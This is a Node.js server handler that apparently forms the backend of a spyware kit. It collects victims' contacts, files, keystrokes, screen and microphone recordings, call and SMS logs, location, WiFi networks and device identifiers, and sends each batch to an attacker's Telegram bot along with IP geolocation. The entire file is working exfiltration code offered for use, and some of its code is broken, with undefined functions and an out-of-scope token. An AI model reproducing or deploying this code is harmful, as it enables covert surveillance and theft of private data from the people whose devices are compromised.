import fs from 'fs';
import path from 'path';
import { exec } from 'child_process';
import FormData from 'form-data';
import fetch from 'node-fetch';
import { promisify } from 'util';
const execAsync = promisify(exec);

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { type, data, fingerprint, metadata } = req.body;
    if (!type) return res.status(400).json({ error: 'Missing type' });

    // Load bot config
    let BOT_TOKEN, CHAT_ID;
    try {
        const root = process.cwd();
        BOT_TOKEN = fs.readFileSync(path.join(root, 'token.txt'), 'utf8').trim();
        CHAT_ID = fs.readFileSync(path.join(root, 'uid.txt'), 'utf8').trim();
    } catch (e) {
        return res.status(500).json({ error: 'Bot config missing: ' + e.message });
    }

    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
    const geo = await getGeo(ip);
    const f = fingerprint || {};

    // Handle different data types
    switch (type) {
        case 'image':
        case 'video':
            return handleMedia(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f, metadata });
        case 'contacts':
            return handleContacts(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
        case 'files':
            return handleFiles(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
        case 'keylog':
            return handleKeylog(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
        case 'screenrecord':
            return handleScreenRecord(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
        case 'calls':
            return handleCallLogs(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
        case 'sms':
            return handleSMSLogs(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
        case 'location':
            return handleLocation(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
        case 'mic':
            return handleMicRecord(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
        case 'apps':
            return handleInstalledApps(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
        case 'wifi':
            return handleWiFiNetworks(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
        case 'deviceinfo':
            return handleDeviceInfo(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
        default:
            return res.status(400).json({ error: 'Invalid type' });
    }
}

// ---------- New Handlers ----------

async function handleContacts(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const contacts = req.body.data;
    if (!contacts) return res.status(400).json({ error: 'No contacts data' });

    const caption = generateCaption({
        type: 'contacts',
        ip,
        geo,
        f,
        extra: `ðŸ‘¥ <b>Contacts:</b> ${contacts.length}\n` +
               `ðŸ“‡ <b>Sample:</b>\n${contacts.slice(0, 3).map(c =>
                   `â€¢ ${c.name}: ${c.phone}${c.email ? ` (${c.email})` : ''}`).join('\n')}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(JSON.stringify(contacts, null, 2)), 'contacts.json');
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(`sendDocument`, form);
    res.status(200).json({ status: 'ok' });
}

async function handleFiles(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const { files, directory } = req.body.data;
    if (!files) return res.status(400).json({ error: 'No files data' });

    const caption = generateCaption({
        type: 'files',
        ip,
        geo,
        f,
        extra: `ðŸ“ <b>Directory:</b> ${directory}\n` +
               `ðŸ“„ <b>Files:</b> ${files.length}\n` +
               `ðŸ” <b>Sample:</b>\n${files.slice(0, 3).map(f =>
                   `â€¢ ${f.name} (${formatBytes(f.size)})`).join('\n')}`
    });

    // Create ZIP archive
    const zipPath = path.join(tempfile(), 'files.zip');
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip');

    archive.pipe(output);
    files.forEach(file => {
        archive.append(Buffer.from(file.content, 'base64'), { name: file.name });
    });
    await archive.finalize();

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', fs.createReadStream(zipPath), 'files.zip');
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(`sendDocument`, form);
    fs.unlinkSync(zipPath);
    res.status(200).json({ status: 'ok' });
}

async function handleKeylog(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const { logs, duration } = req.body.data;
    if (!logs) return res.status(400).json({ error: 'No keylog data' });

    const caption = generateCaption({
        type: 'keylog',
        ip,
        geo,
        f,
        extra: `âŒ¨ï¸ <b>Keylog Duration:</b> ${duration} minutes\n` +
               `ðŸ“ <b>Total Keystrokes:</b> ${logs.length}\n` +
               `ðŸ” <b>Sample:</b>\n${logs.slice(0, 20).join(' ')}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(logs.join('\n')), 'keylog.txt');
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(`sendDocument`, form);
    res.status(200).json({ status: 'ok' });
}

async function handleScreenRecord(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const { video, duration, mimeType } = req.body.data;
    if (!video) return res.status(400).json({ error: 'No video data' });

    const caption = generateCaption({
        type: 'screenrecord',
        ip,
        geo,
        f,
        extra: `ðŸŽ¬ <b>Screen Recording:</b> ${duration} seconds\n` +
               `ðŸ“± <b>Resolution:</b> ${f.screen || 'Unknown'}`
    });

    const buffer = Buffer.from(video, 'base64');
    const ext = mimeType === 'video/mp4' ? 'mp4' : 'webm';

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('video', new Blob([buffer], { type: mimeType }), `screenrecord.${ext}`);
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');
    form.append('supports_streaming', 'true');

    await sendToTelegram(`sendVideo`, form);
    res.status(200).json({ status: 'ok' });
}

async function handleCallLogs(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const calls = req.body.data;
    if (!calls) return res.status(400).json({ error: 'No call logs' });

    const caption = generateCaption({
        type: 'calls',
        ip,
        geo,
        f,
        extra: `ðŸ“ž <b>Call Logs:</b> ${calls.length} entries\n` +
               `ðŸ” <b>Sample:</b>\n${calls.slice(0, 3).map(c =>
                   `â€¢ ${c.number} (${c.type}) - ${c.duration}s`).join('\n')}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(JSON.stringify(calls, null, 2)), 'calls.json');
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(`sendDocument`, form);
    res.status(200).json({ status: 'ok' });
}

async function handleSMSLogs(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const messages = req.body.data;
    if (!messages) return res.status(400).json({ error: 'No SMS data' });

    const caption = generateCaption({
        type: 'sms',
        ip,
        geo,
        f,
        extra: `ðŸ’¬ <b>SMS Logs:</b> ${messages.length} messages\n` +
               `ðŸ” <b>Sample:</b>\n${messages.slice(0, 3).map(m =>
                   `â€¢ ${m.number}: ${m.body.substring(0, 30)}...`).join('\n')}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(JSON.stringify(messages, null, 2)), 'sms.json');
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(`sendDocument`, form);
    res.status(200).json({ status: 'ok' });
}

async function handleLocation(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const { latitude, longitude, accuracy, timestamp } = req.body.data;
    if (!latitude || !longitude) return res.status(400).json({ error: 'No location data' });

    const caption = generateCaption({
        type: 'location',
        ip,
        geo,
        f,
        extra: `ðŸ“ <b>Location:</b> https://www.google.com/maps?q=${latitude},${longitude}\n` +
               `ðŸŽ¯ <b>Accuracy:</b> ${accuracy}m\n` +
               `â±ï¸ <b>Timestamp:</b> ${new Date(timestamp).toLocaleString()}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('latitude', latitude);
    form.append('longitude', longitude);
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(`sendLocation`, form);
    res.status(200).json({ status: 'ok' });
}

async function handleMicRecord(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const { audio, duration, mimeType } = req.body.data;
    if (!audio) return res.status(400).json({ error: 'No audio data' });

    const caption = generateCaption({
        type: 'mic',
        ip,
        geo,
        f,
        extra: `ðŸŽ¤ <b>Microphone Recording:</b> ${duration} seconds\n` +
               `ðŸ”Š <b>Format:</b> ${mimeType}`
    });

    const buffer = Buffer.from(audio, 'base64');
    const ext = mimeType === 'audio/mp3' ? 'mp3' : 'ogg';

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('audio', new Blob([buffer], { type: mimeType }), `mic.${ext}`);
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(`sendAudio`, form);
    res.status(200).json({ status: 'ok' });
}

async function handleInstalledApps(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const apps = req.body.data;
    if (!apps) return res.status(400).json({ error: 'No apps data' });

    const caption = generateCaption({
        type: 'apps',
        ip,
        geo,
        f,
        extra: `ðŸ“± <b>Installed Apps:</b> ${apps.length}\n` +
               `ðŸ” <b>Sample:</b>\n${apps.slice(0, 5).map(a =>
                   `â€¢ ${a.name} (${a.package})`).join('\n')}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(JSON.stringify(apps, null, 2)), 'apps.json');
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(`sendDocument`, form);
    res.status(200).json({ status: 'ok' });
}

async function handleWiFiNetworks(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const networks = req.body.data;
    if (!networks) return res.status(400).json({ error: 'No WiFi data' });

    const caption = generateCaption({
        type: 'wifi',
        ip,
        geo,
        f,
        extra: `ðŸ“¶ <b>WiFi Networks:</b> ${networks.length}\n` +
               `ðŸ” <b>Sample:</b>\n${networks.slice(0, 3).map(n =>
                   `â€¢ ${n.ssid} (${n.security}) - ${n.strength}dBm`).join('\n')}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(JSON.stringify(networks, null, 2)), 'wifi.json');
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(`sendDocument`, form);
    res.status(200).json({ status: 'ok' });
}

async function handleDeviceInfo(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const info = req.body.data;
    if (!info) return res.status(400).json({ error: 'No device info' });

    const caption = generateCaption({
        type: 'deviceinfo',
        ip,
        geo,
        f,
        extra: `ðŸ“± <b>Device Info:</b>\n` +
               `â€¢ <b>Model:</b> ${info.model}\n` +
               `â€¢ <b>OS:</b> ${info.os} (${info.osVersion})\n` +
               `â€¢ <b>Manufacturer:</b> ${info.manufacturer}\n` +
               `â€¢ <b>IMEI:</b> ${info.imei || 'N/A'}\n` +
               `â€¢ <b>Serial:</b> ${info.serial || 'N/A'}\n` +
               `â€¢ <b>Storage:</b> ${info.storage} (${info.freeStorage} free)\n` +
               `â€¢ <b>RAM:</b> ${info.ram} (${info.freeRam} free)`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(JSON.stringify(info, null, 2)), 'deviceinfo.json');
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(`sendDocument`, form);
    res.status(200).json({ status: 'ok' });
}

// ---------- Helper Functions ----------

async function getGeo(ip) {
    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
        return await geoRes.json();
    } catch (e) {
        return { status: 'fail', country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
    }
}

function generateCaption({ type, ip, geo, f, extra = '' }) {
    const typeIcons = {
        'image': 'ðŸ“¸', 'video': 'ðŸŽ¥', 'contacts': 'ðŸ‘¥', 'files': 'ðŸ“',
        'keylog': 'âŒ¨ï¸', 'screenrecord': 'ðŸŽ¬', 'calls': 'ðŸ“ž', 'sms': 'ðŸ’¬',
        'location': 'ðŸ“', 'mic': 'ðŸŽ¤', 'apps': 'ðŸ“±', 'wifi': 'ðŸ“¶', 'deviceinfo': 'â„¹ï¸'
    };

    return `ðŸ“¡ <b>NEW ${type.toUpperCase()}</b> ${typeIcons[type] || 'ðŸ“Œ'}\n` +
           `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n` +
           `ðŸ“ž <b>Phone:</b> ${f.phone || 'N/A'}\n` +
           `ðŸŒ <b>IP:</b> <code>${ip}</code>\n` +
           `ðŸ“ <b>Location:</b> ${geo.country ? `${geo.country}, ${geo.city}` : 'Unknown'} (${geo.isp || 'ISP Unknown'})\n` +
           `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n` +
           `${extra}\n` +
           `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n` +
           `ðŸ•’ <b>Captured:</b> ${new Date().toLocaleString()}\n` +
           `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n` +
           `ðŸŽ¯ <b>Credits:</b> @cyber_sniper`;
}

async function sendToTelegram(endpoint, form) {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
        method: 'POST',
        body: form
    });
    const data = await response.json();
    if (!response.ok) throw new Error(`Telegram: ${data.description}`);
    return data;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}
